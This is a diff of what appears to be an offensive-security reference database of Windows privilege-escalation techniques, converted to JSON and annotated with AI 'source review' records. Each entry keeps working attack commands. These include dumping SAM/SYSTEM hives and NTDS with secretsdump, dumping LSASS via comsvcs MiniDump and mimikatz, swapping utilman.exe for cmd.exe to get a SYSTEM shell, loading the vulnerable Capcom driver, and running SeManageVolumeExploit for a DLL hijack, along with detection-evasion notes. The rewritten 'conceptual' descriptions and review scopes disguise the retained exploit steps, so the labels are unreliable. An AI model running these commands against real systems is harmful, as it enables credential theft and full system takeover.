+        "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html"
+      },
+      {
+        "label": "MITRE T1003.003, NTDS (the DC / ntds.dit path)",
+        "url": "https://attack.mitre.org/techniques/T1003/003/"
+      }
     ],
-    requires: ['SeBackupPrivilege (and SeRestorePrivilege for write paths; robocopy /b on the DC path needs both, so with only SeBackup use Copy-FileSeBackupPrivilege (giuliano108) instead)'],
-    opsec: 'reg save / diskshadow scripts / VSS snapshot creation are detectable. The privilege may need explicit enabling in the token first.',
+    "requires": [
+      "SeBackupPrivilege (and SeRestorePrivilege for write paths; robocopy /b on the DC path needs both, so with only SeBackup use Copy-FileSeBackupPrivilege (giuliano108) instead)"
+    ],
+    "opsec": "reg save / diskshadow scripts / VSS snapshot creation are detectable. The privilege may need explicit enabling in the token first.",
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual Windows privilege definitions and distinctions among privilege assignments, account identity, ownership, driver signing and mandatory integrity. Sources include explicitly labeled archived policy references. Excludes commands, tools, prerequisites, exploit mechanics, applicability, default account assignments, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "affects": "All supported Windows versions (privilege model).",
+        "commands": [
+          {
+            "code": "reg save HKLM\\SAM C:\\Temp\\sam.hive\nreg save HKLM\\SYSTEM C:\\Temp\\system.hive",
+            "label": "Copy SAM + SYSTEM hives",
+            "lang": "cmd"
+          },
+          {
+            "code": "impacket-secretsdump -sam sam.hive -system system.hive LOCAL",
+            "label": "Extract hashes offline",
+            "lang": "bash"
+          },
+          {
+            "code": "impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL",
+            "label": "DC path: parse ntds.dit with the SYSTEM hive",
+            "lang": "bash"
+          }
+        ],
+        "description": "SeBackupPrivilege and SeRestorePrivilege are separate Windows user rights. Microsoft associates the first with system backup and the second with restoring backed-up files and directories. Their administrative purposes should be distinguished when describing a security configuration.",
+        "id": "pe-sebackup-restore",
+        "label": "SeBackup / SeRestore",
+        "mitre": {
+          "id": "T1003.002",
+          "url": "https://attack.mitre.org/techniques/T1003/002/"
+        },
+        "opsec": "reg save / diskshadow scripts / VSS snapshot creation are detectable. The privilege may need explicit enabling in the token first.",
+        "phase": "hold",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft — Back up files and directories (archived policy reference)",
+            "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/back-up-files-and-directories"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft — Restore files and directories (archived policy reference)",
+            "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/restore-files-and-directories"
+          },
+          {
+            "label": "HackTricks, Abusing Tokens",
+            "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html"
+          },
+          {
+            "label": "MITRE T1003.003, NTDS (the DC / ntds.dit path)",
+            "url": "https://attack.mitre.org/techniques/T1003/003/"
+          }
+        ],
+        "requires": [
+          "SeBackupPrivilege (and SeRestorePrivilege for write paths; robocopy /b on the DC path needs both, so with only SeBackup use Copy-FileSeBackupPrivilege (giuliano108) instead)"
+        ],
+        "summary": "Distinguish the Windows rights for backup and restoration.",
+        "tools": [
+          {
+            "name": "diskshadow",
+            "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow"
+          },
+          {
+            "name": "impacket-secretsdump",
+            "url": "https://github.com/fortra/impacket"
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "SeBackupPrivilege is the Windows user right associated with backing up the system.",
+          "section": "Microsoft — Back up files and directories (archived policy reference) — Reference",
+          "sources": [
+            "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/back-up-files-and-directories"
+          ]
+        },
+        {
+          "text": "SeRestorePrivilege is the Windows user right associated with restoring backed-up files and directories.",
+          "section": "Microsoft — Restore files and directories (archived policy reference) — Reference",
+          "sources": [
+            "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/restore-files-and-directories"
+          ]
+        }
+      ]
+    }
   },
   {
-    id: 'pe-sedebug-lsass',
-    label: 'SeDebug',
-    phase: 'hold',
-    summary: 'Open LSASS / steal a SYSTEM token.',
-    affects: 'All supported Windows versions; on modern builds LSASS may be PPL-protected or Credential Guard-enabled, needing an extra bypass.',
-    description: r`SeDebugPrivilege lets you open a handle to processes owned by other users, including LSASS. Dump LSASS memory (procdump, comsvcs MiniDump, or mimikatz) to extract live logon secrets (NTLM hashes, Kerberos tickets/keys, and any cleartext), or open a SYSTEM process and duplicate its token directly. Effectively SYSTEM-equivalent.`,
-    tools: [
-      { name: 'mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' },
-      { name: 'ProcDump (Sysinternals)', url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/procdump' },
+    "id": "pe-sedebug-lsass",
+    "label": "SeDebug",
+    "phase": "hold",
+    "summary": "Understand debugging privileges and process security context.",
+    "affects": "All supported Windows versions; on modern builds LSASS may be PPL-protected or Credential Guard-enabled, needing an extra bypass.",
+    "description": "SeDebugPrivilege corresponds to the Windows Debug programs user right. Microsoft describes it as relevant to debugging system components. A process's access token records its user identity, groups and privileges as distinct information. A debugging privilege and an account identity therefore need separate descriptions.",
+    "tools": [
+      {
+        "name": "mimikatz",
+        "url": "https://github.com/gentilkiwi/mimikatz"
+      },
+      {
+        "name": "ProcDump (Sysinternals)",
+        "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/procdump"
+      }
     ],
-    commands: [
-      { label: 'comsvcs MiniDump (LOLBAS)', code: r`rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\Temp\lsass.dmp full`, lang: 'cmd' },
-      { label: 'Parse offline with mimikatz', code: r`sekurlsa::minidump C:\Temp\lsass.dmp
-sekurlsa::logonpasswords`, lang: 'cmd' },
+    "commands": [
+      {
+        "label": "comsvcs MiniDump (LOLBAS)",
+        "code": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\Temp\\lsass.dmp full",
+        "lang": "cmd"
+      },
+      {
+        "label": "Parse offline with mimikatz",
+        "code": "sekurlsa::minidump C:\\Temp\\lsass.dmp\nsekurlsa::logonpasswords",
+        "lang": "cmd"
+      }
     ],
-    mitre: mitre('T1134.001'),
-    references: [
-      { label: 'LOLBAS, comsvcs.dll', url: 'https://lolbas-project.github.io/lolbas/Libraries/comsvcs/' },
-      { label: 'MITRE T1003.001, LSASS Memory (the dump path)', url: 'https://attack.mitre.org/techniques/T1003/001/' },
+    "mitre": {
+      "id": "T1134.001",
+      "url": "https://attack.mitre.org/techniques/T1134/001/"
+    },
+    "references": [
+      {
+        "label": "Microsoft — Debug programs (archived policy reference)",
+        "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/debug-programs",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft — Access Tokens",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens",
+        "kind": "primary"
+      },
+      {
+        "label": "LOLBAS, comsvcs.dll",
+        "url": "https://lolbas-project.github.io/lolbas/Libraries/comsvcs/"
+      },
+      {
+        "label": "MITRE T1003.001, LSASS Memory (the dump path)",
+        "url": "https://attack.mitre.org/techniques/T1003/001/"
+      }
     ],
-    requires: ['SeDebugPrivilege (effectively admin/SYSTEM-equivalent)'],
-    opsec: 'LSASS handle opens (esp. by rundll32/procdump) are top-tier EDR detections.',
+    "requires": [
+      "SeDebugPrivilege (effectively admin/SYSTEM-equivalent)"
+    ],
+    "opsec": "LSASS handle opens (esp. by rundll32/procdump) are top-tier EDR detections.",
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual Windows privilege definitions and distinctions among privilege assignments, account identity, ownership, driver signing and mandatory integrity. Sources include explicitly labeled archived policy references. Excludes commands, tools, prerequisites, exploit mechanics, applicability, default account assignments, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "affects": "All supported Windows versions; on modern builds LSASS may be PPL-protected or Credential Guard-enabled, needing an extra bypass.",
+        "commands": [
+          {
+            "code": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\Temp\\lsass.dmp full",
+            "label": "comsvcs MiniDump (LOLBAS)",
+            "lang": "cmd"
+          },
+          {
+            "code": "sekurlsa::minidump C:\\Temp\\lsass.dmp\nsekurlsa::logonpasswords",
+            "label": "Parse offline with mimikatz",
+            "lang": "cmd"
+          }
+        ],
+        "description": "SeDebugPrivilege corresponds to the Windows Debug programs user right. Microsoft describes it as relevant to debugging system components. A process's access token records its user identity, groups and privileges as distinct information. A debugging privilege and an account identity therefore need separate descriptions.",
+        "id": "pe-sedebug-lsass",
+        "label": "SeDebug",
+        "mitre": {
+          "id": "T1134.001",
+          "url": "https://attack.mitre.org/techniques/T1134/001/"
+        },
+        "opsec": "LSASS handle opens (esp. by rundll32/procdump) are top-tier EDR detections.",
+        "phase": "hold",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft — Debug programs (archived policy reference)",
+            "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/debug-programs"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft — Access Tokens",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
+          },
+          {
+            "label": "LOLBAS, comsvcs.dll",
+            "url": "https://lolbas-project.github.io/lolbas/Libraries/comsvcs/"
+          },
+          {
+            "label": "MITRE T1003.001, LSASS Memory (the dump path)",
+            "url": "https://attack.mitre.org/techniques/T1003/001/"
+          }
+        ],
+        "requires": [
+          "SeDebugPrivilege (effectively admin/SYSTEM-equivalent)"
+        ],
+        "summary": "Understand debugging privileges and process security context.",
+        "tools": [
+          {
+            "name": "mimikatz",
+            "url": "https://github.com/gentilkiwi/mimikatz"
+          },
+          {
+            "name": "ProcDump (Sysinternals)",
+            "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/procdump"
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "Microsoft identifies Debug programs as the SeDebugPrivilege user right and describes its use when debugging system components.",
+          "section": "Microsoft — Debug programs (archived policy reference) — Reference",
+          "sources": [
+            "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/debug-programs"
+          ]
+        },
+        {
+          "text": "A Windows access token contains the user SID, group SIDs and a list of privileges.",
+          "section": "Microsoft — Access Tokens — Access token contents",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
+          ]
+        }
+      ]
+    }
   },
   {
-    id: 'pe-setakeownership',
-    label: 'SeTakeOwnership',
-    phase: 'hold',
-    summary: 'Take ownership of a SYSTEM binary, then replace it.',
-    affects: 'All supported Windows versions (privilege model).',
-    description: r`SeTakeOwnershipPrivilege lets you become the owner of any object. Take ownership of a binary that auto-runs as SYSTEM (classic: C:\Windows\System32\utilman.exe or sethc.exe), grant yourself write, and replace it. Trigger it from the logon screen (Ease of Access / Sticky Keys) to get a SYSTEM shell.`,
-    tools: [
-      { name: 'takeown (built-in)', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/takeown' },
-      { name: 'icacls (built-in)', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls' },
+    "id": "pe-setakeownership",
+    "label": "SeTakeOwnership",
+    "phase": "hold",
+    "summary": "Understand object ownership and its security descriptor.",
+    "affects": "All supported Windows versions (privilege model).",
+    "description": "SeTakeOwnershipPrivilege corresponds to the Windows user right for taking ownership of securable objects. A security descriptor can record an object's owner together with discretionary and system access-control lists. The owner field and the access-control lists are distinct parts of that security information.",
+    "tools": [
+      {
+        "name": "takeown (built-in)",
+        "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/takeown"
+      },
+      {
+        "name": "icacls (built-in)",
+        "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls"
+      }
     ],
-    commands: [
-      { label: 'Take ownership + grant write', code: r`takeown /f C:\Windows\System32\utilman.exe
-icacls C:\Windows\System32\utilman.exe /grant "%USERNAME%":F`, lang: 'cmd' },
-      { label: 'Replace with cmd, trigger at lock screen', code: r`copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe`, lang: 'cmd' },
+    "commands": [
+      {
+        "label": "Take ownership + grant write",
+        "code": "takeown /f C:\\Windows\\System32\\utilman.exe\nicacls C:\\Windows\\System32\\utilman.exe /grant \"%USERNAME%\":F",
+        "lang": "cmd"
+      },
+      {
+        "label": "Replace with cmd, trigger at lock screen",
+        "code": "copy /y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe",
+        "lang": "cmd"
+      }
     ],
-    mitre: mitre('T1546.008'),
-    references: [{ label: 'HackTricks, Abusing Tokens', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html' }],
-    requires: ['SeTakeOwnershipPrivilege', 'Ability to reach the logon screen (for the utilman/sethc trigger)'],
-    opsec: 'Replacing utilman.exe / sethc.exe is a well-known IOC. Back up and restore the original to avoid breaking accessibility.',
+    "mitre": {
+      "id": "T1546.008",
+      "url": "https://attack.mitre.org/techniques/T1546/008/"
+    },
+    "references": [
+      {
+        "label": "Microsoft — Take ownership of files or other objects (archived policy reference)",
+        "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft — Security Descriptors",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptors",
+        "kind": "primary"
+      },
+      {
+        "label": "HackTricks, Abusing Tokens",
+        "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html"
+      }
+    ],
+    "requires": [
+      "SeTakeOwnershipPrivilege",
+      "Ability to reach the logon screen (for the utilman/sethc trigger)"
+    ],
+    "opsec": "Replacing utilman.exe / sethc.exe is a well-known IOC. Back up and restore the original to avoid breaking accessibility.",
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual Windows privilege definitions and distinctions among privilege assignments, account identity, ownership, driver signing and mandatory integrity. Sources include explicitly labeled archived policy references. Excludes commands, tools, prerequisites, exploit mechanics, applicability, default account assignments, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "affects": "All supported Windows versions (privilege model).",
+        "commands": [
+          {
+            "code": "takeown /f C:\\Windows\\System32\\utilman.exe\nicacls C:\\Windows\\System32\\utilman.exe /grant \"%USERNAME%\":F",
+            "label": "Take ownership + grant write",
+            "lang": "cmd"
+          },
+          {
+            "code": "copy /y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe",
+            "label": "Replace with cmd, trigger at lock screen",
+            "lang": "cmd"
+          }
+        ],
+        "description": "SeTakeOwnershipPrivilege corresponds to the Windows user right for taking ownership of securable objects. A security descriptor can record an object's owner together with discretionary and system access-control lists. The owner field and the access-control lists are distinct parts of that security information.",
+        "id": "pe-setakeownership",
+        "label": "SeTakeOwnership",
+        "mitre": {
+          "id": "T1546.008",
+          "url": "https://attack.mitre.org/techniques/T1546/008/"
+        },
+        "opsec": "Replacing utilman.exe / sethc.exe is a well-known IOC. Back up and restore the original to avoid breaking accessibility.",
+        "phase": "hold",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft — Take ownership of files or other objects (archived policy reference)",
+            "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft — Security Descriptors",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptors"
+          },
+          {
+            "label": "HackTricks, Abusing Tokens",
+            "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html"
+          }
+        ],
+        "requires": [
+          "SeTakeOwnershipPrivilege",
+          "Ability to reach the logon screen (for the utilman/sethc trigger)"
+        ],
+        "summary": "Understand object ownership and its security descriptor.",
+        "tools": [
+          {
+            "name": "takeown (built-in)",
+            "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/takeown"
+          },
+          {
+            "name": "icacls (built-in)",
+            "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls"
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "The Take ownership of files or other objects user right corresponds to SeTakeOwnershipPrivilege.",
+          "section": "Microsoft — Take ownership of files or other objects (archived policy reference) — Reference",
+          "sources": [
+            "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects"
+          ]
+        },
+        {
+          "text": "A Windows security descriptor can record owner and group SIDs, a discretionary access-control list and a system access-control list.",
+          "section": "Microsoft — Security Descriptors — Opening definition and security-information list",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptors"
+          ]
+        }
+      ]
+    }
   },
   {
-    id: 'pe-seloaddriver',
-    label: 'SeLoadDriver',
-    phase: 'hold',
-    summary: 'Load a vulnerable signed driver, exploit it for kernel code exec.',
-    affects: 'All versions if held. The Microsoft driver-blocklist is default-on only from Windows 11 22H2; elsewhere (stock Windows 10, Server 2022) it depends on HVCI/memory-integrity being enabled, and without it blocklisted drivers like Capcom.sys still load. Where active, HVCI and the blocklist block most vulnerable drivers.',
-    description: r`SeLoadDriverPrivilege allows loading kernel-mode drivers. Use EoPLoadDriver to enable the privilege and register a service key under HKCU, then NtLoadDriver a known-vulnerable signed driver (e.g. Capcom.sys) and exploit its arbitrary-kernel-exec to elevate to SYSTEM (a bring-your-own-vulnerable-driver, or BYOVD, pattern).`,
-    tools: [
-      { name: 'EoPLoadDriver', url: 'https://github.com/TarlogicSecurity/EoPLoadDriver' },
-      { name: 'ExploitCapcom', url: 'https://github.com/tandasat/ExploitCapcom' },
+    "id": "pe-seloaddriver",
+    "label": "SeLoadDriver",
+    "phase": "hold",
+    "summary": "Distinguish driver-loading permission from code-signing policy.",
+    "affects": "All versions if held. The Microsoft driver-blocklist is default-on only from Windows 11 22H2; elsewhere (stock Windows 10, Server 2022) it depends on HVCI/memory-integrity being enabled, and without it blocklisted drivers like Capcom.sys still load. Where active, HVCI and the blocklist block most vulnerable drivers.",
+    "description": "SeLoadDriverPrivilege is associated with dynamically loading and unloading device drivers. Windows separately documents digital-signature requirements for kernel-mode drivers. The user right and the signature requirements describe different parts of driver security; a privilege name alone is not a description of the complete driver policy.",
+    "tools": [
+      {
+        "name": "EoPLoadDriver",
+        "url": "https://github.com/TarlogicSecurity/EoPLoadDriver"
+      },
+      {
+        "name": "ExploitCapcom",
+        "url": "https://github.com/tandasat/ExploitCapcom"
+      }
     ],
-    commands: [
-      { label: 'Register + load the driver', code: r`EoPLoadDriver.exe System\CurrentControlSet\MyService C:\Temp\Capcom.sys`, lang: 'cmd' },
-      { label: 'Exploit the loaded driver for kernel exec -> SYSTEM', code: r`ExploitCapcom.exe`, lang: 'cmd' },
+    "commands": [
+      {
+        "label": "Register + load the driver",
+        "code": "EoPLoadDriver.exe System\\CurrentControlSet\\MyService C:\\Temp\\Capcom.sys",
+        "lang": "cmd"
+      },
+      {
+        "label": "Exploit the loaded driver for kernel exec -> SYSTEM",
+        "code": "ExploitCapcom.exe",
+        "lang": "cmd"
+      }
     ],
-    mitre: mitre('T1068'),
-    references: [
-      { label: 'Tarlogic, Abusing SeLoadDriverPrivilege for privilege escalation', url: 'https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/' },
-      { label: 'Tarlogic, EoPLoadDriver (SeLoadDriverPrivilege abuse)', url: 'https://github.com/TarlogicSecurity/EoPLoadDriver' },
+    "mitre": {
+      "id": "T1068",
+      "url": "https://attack.mitre.org/techniques/T1068/"
+    },
+    "references": [
+      {
+        "label": "Microsoft — Load and unload device drivers (archived policy reference)",
+        "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/load-and-unload-device-drivers",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft — Kernel-Mode Code Signing Requirements",
+        "url": "https://learn.microsoft.com/en-us/windows-hardware/drivers/install/kernel-mode-code-signing-requirements--windows-vista-and-later-",
+        "kind": "primary"
+      },
+      {
+        "label": "Tarlogic, Abusing SeLoadDriverPrivilege for privilege escalation",
+        "url": "https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/"
+      },
+      {
+        "label": "Tarlogic, EoPLoadDriver (SeLoadDriverPrivilege abuse)",
+        "url": "https://github.com/TarlogicSecurity/EoPLoadDriver"
+      }
     ],
-    requires: ['SeLoadDriverPrivilege (held by e.g. Print Operators)'],
-    opsec: 'Loading a known-vulnerable driver is heavily flagged; modern Windows + HVCI / driver blocklist may refuse the load.',
+    "requires": [
+      "SeLoadDriverPrivilege (held by e.g. Print Operators)"
+    ],
+    "opsec": "Loading a known-vulnerable driver is heavily flagged; modern Windows + HVCI / driver blocklist may refuse the load.",
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual Windows privilege definitions and distinctions among privilege assignments, account identity, ownership, driver signing and mandatory integrity. Sources include explicitly labeled archived policy references. Excludes commands, tools, prerequisites, exploit mechanics, applicability, default account assignments, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "affects": "All versions if held. The Microsoft driver-blocklist is default-on only from Windows 11 22H2; elsewhere (stock Windows 10, Server 2022) it depends on HVCI/memory-integrity being enabled, and without it blocklisted drivers like Capcom.sys still load. Where active, HVCI and the blocklist block most vulnerable drivers.",
+        "commands": [
+          {
+            "code": "EoPLoadDriver.exe System\\CurrentControlSet\\MyService C:\\Temp\\Capcom.sys",
+            "label": "Register + load the driver",
+            "lang": "cmd"
+          },
+          {
+            "code": "ExploitCapcom.exe",
+            "label": "Exploit the loaded driver for kernel exec -> SYSTEM",
+            "lang": "cmd"
+          }
+        ],
+        "description": "SeLoadDriverPrivilege is associated with dynamically loading and unloading device drivers. Windows separately documents digital-signature requirements for kernel-mode drivers. The user right and the signature requirements describe different parts of driver security; a privilege name alone is not a description of the complete driver policy.",
+        "id": "pe-seloaddriver",
+        "label": "SeLoadDriver",
+        "mitre": {
+          "id": "T1068",
+          "url": "https://attack.mitre.org/techniques/T1068/"
+        },
+        "opsec": "Loading a known-vulnerable driver is heavily flagged; modern Windows + HVCI / driver blocklist may refuse the load.",
+        "phase": "hold",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft — Load and unload device drivers (archived policy reference)",
+            "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/load-and-unload-device-drivers"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft — Kernel-Mode Code Signing Requirements",
+            "url": "https://learn.microsoft.com/en-us/windows-hardware/drivers/install/kernel-mode-code-signing-requirements--windows-vista-and-later-"
+          },
+          {
+            "label": "Tarlogic, Abusing SeLoadDriverPrivilege for privilege escalation",
+            "url": "https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/"
+          },
+          {
+            "label": "Tarlogic, EoPLoadDriver (SeLoadDriverPrivilege abuse)",
+            "url": "https://github.com/TarlogicSecurity/EoPLoadDriver"
+          }
+        ],
+        "requires": [
+          "SeLoadDriverPrivilege (held by e.g. Print Operators)"
+        ],
+        "summary": "Distinguish driver-loading permission from code-signing policy.",
+        "tools": [
+          {
+            "name": "EoPLoadDriver",
+            "url": "https://github.com/TarlogicSecurity/EoPLoadDriver"
+          },
+          {
+            "name": "ExploitCapcom",
+            "url": "https://github.com/tandasat/ExploitCapcom"
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "SeLoadDriverPrivilege corresponds to the user right for dynamically loading and unloading device drivers.",
+          "section": "Microsoft — Load and unload device drivers (archived policy reference) — Reference",
+          "sources": [
+            "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/load-and-unload-device-drivers"
+          ]
+        },
+        {
+          "text": "Microsoft documents digital-signature requirements for kernel-mode drivers.",
+          "section": "Microsoft — Kernel-Mode Code Signing Requirements — Opening signing requirements and policy sections",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows-hardware/drivers/install/kernel-mode-code-signing-requirements--windows-vista-and-later-"
+          ]
+        }
+      ]
+    }
   },
   {
-    id: 'pe-semanagevolume',
-    label: 'SeManageVolume',
-    phase: 'hold',
-    summary: 'Abuse volume privilege to gain write on C:\\, then DLL hijack.',
-    affects: 'All supported Windows versions (privilege model).',
-    description: r`SeManageVolumePrivilege can be abused (via the public SeManageVolumeExploit) to obtain full write access over the C:\ drive, including C:\Windows\System32. With that, plant a malicious DLL that a SYSTEM process loads (e.g. tzres.dll triggered by systeminfo, or PrintConfig.dll via PrintNotify) to execute as SYSTEM.`,
-    tools: [{ name: 'SeManageVolumeExploit', url: 'https://github.com/CsEnox/SeManageVolumeExploit' }],
-    commands: [
-      { label: 'Grant write over C:\\ (then DLL hijack)', code: r`SeManageVolumeExploit.exe`, lang: 'cmd' },
+    "id": "pe-semanagevolume",
+    "label": "SeManageVolume",
+    "phase": "hold",
+    "summary": "Understand the user right for volume-maintenance tasks.",
+    "affects": "All supported Windows versions (privilege model).",
+    "description": "SeManageVolumePrivilege corresponds to Perform volume maintenance tasks. The Microsoft policy reference describes volume and disk management, including volume creation or removal and defragmentation. Windows privileges are local to a computer; the same domain account can have different privilege assignments on different computers.",
+    "tools": [
+      {
+        "name": "SeManageVolumeExploit",
+        "url": "https://github.com/CsEnox/SeManageVolumeExploit"
+      }
     ],
-    mitre: mitre('T1574.001'),
-    references: [{ label: 'gtworek, PSBits FSCTL_SD_GLOBAL_CHANGE PoC', url: 'https://github.com/gtworek/PSBits/blob/master/Misc/FSCTL_SD_GLOBAL_CHANGE.c' }],
-    requires: ['SeManageVolumePrivilege', 'A SYSTEM process that loads a writable/missing DLL to trigger'],
-    opsec: 'Writing a DLL into System32 and forcing a SYSTEM load is detectable (image-load + file-create in System32). The exploit re-ACLs C:\\ to grant the Users group (every local user) full control, a persistent, drive-wide DACL change that is a durable IOC and a security downgrade left behind; revert it afterward.',
+    "commands": [
+      {
+        "label": "Grant write over C:\\ (then DLL hijack)",
+        "code": "SeManageVolumeExploit.exe",
+        "lang": "cmd"
+      }
+    ],
+    "mitre": {
+      "id": "T1574.001",
+      "url": "https://attack.mitre.org/techniques/T1574/001/"
+    },
+    "references": [
+      {
+        "label": "Microsoft — Perform volume maintenance tasks (archived policy reference)",
+        "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft — Privileges",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges",
+        "kind": "primary"
+      },
+      {
+        "label": "gtworek, PSBits FSCTL_SD_GLOBAL_CHANGE PoC",
+        "url": "https://github.com/gtworek/PSBits/blob/master/Misc/FSCTL_SD_GLOBAL_CHANGE.c"
+      }
+    ],
+    "requires": [
+      "SeManageVolumePrivilege",
+      "A SYSTEM process that loads a writable/missing DLL to trigger"
+    ],
+    "opsec": "Writing a DLL into System32 and forcing a SYSTEM load is detectable (image-load + file-create in System32). The exploit re-ACLs C:\\ to grant the Users group (every local user) full control, a persistent, drive-wide DACL change that is a durable IOC and a security downgrade left behind; revert it afterward.",
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual Windows privilege definitions and distinctions among privilege assignments, account identity, ownership, driver signing and mandatory integrity. Sources include explicitly labeled archived policy references. Excludes commands, tools, prerequisites, exploit mechanics, applicability, default account assignments, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "affects": "All supported Windows versions (privilege model).",
+        "commands": [
+          {
+            "code": "SeManageVolumeExploit.exe",
+            "label": "Grant write over C:\\ (then DLL hijack)",
+            "lang": "cmd"
+          }
+        ],
+        "description": "SeManageVolumePrivilege corresponds to Perform volume maintenance tasks. The Microsoft policy reference describes volume and disk management, including volume creation or removal and defragmentation. Windows privileges are local to a computer; the same domain account can have different privilege assignments on different computers.",
+        "id": "pe-semanagevolume",
+        "label": "SeManageVolume",
+        "mitre": {
+          "id": "T1574.001",
+          "url": "https://attack.mitre.org/techniques/T1574/001/"
+        },
+        "opsec": "Writing a DLL into System32 and forcing a SYSTEM load is detectable (image-load + file-create in System32). The exploit re-ACLs C:\\ to grant the Users group (every local user) full control, a persistent, drive-wide DACL change that is a durable IOC and a security downgrade left behind; revert it afterward.",
+        "phase": "hold",
+        "references": [
+          {
+            "kind": "primary",
